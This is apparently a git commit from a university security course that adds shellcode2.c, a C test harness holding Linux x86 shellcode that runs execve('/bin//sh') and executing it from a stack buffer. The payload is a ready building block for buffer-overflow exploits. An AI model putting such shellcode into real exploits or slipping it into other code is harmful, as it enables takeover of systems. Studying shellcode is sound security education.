6b2792419b5d1eba7fd2ff6dc3f61d1aae4f70b7
Andrew Niklas <acniklas@cpp.edu>
2016-02-29 16:51:11 -0800

    created given files and initial commit

---
+++ shellcode2.c
@@ -0,0 +1,26 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+
+const char shellcode[] =
+	"\x31\xc0"
+	"\x50"
+	"\x68""//sh"
+	"\x68""/bin"
+	"\x89\xe3"
+	"\x50"
+	"\x53"
+	"\x89\xe1"
+	"\x99"
+	"\xb0\x0b"
+	"\xcd\x80"
+;
+
+
+int main(){
+	char buffer[sizeof(shellcode)];
+	strcpy(buffer, shellcode);
+	((void(*)())buffer)();
+	return 0;
+}
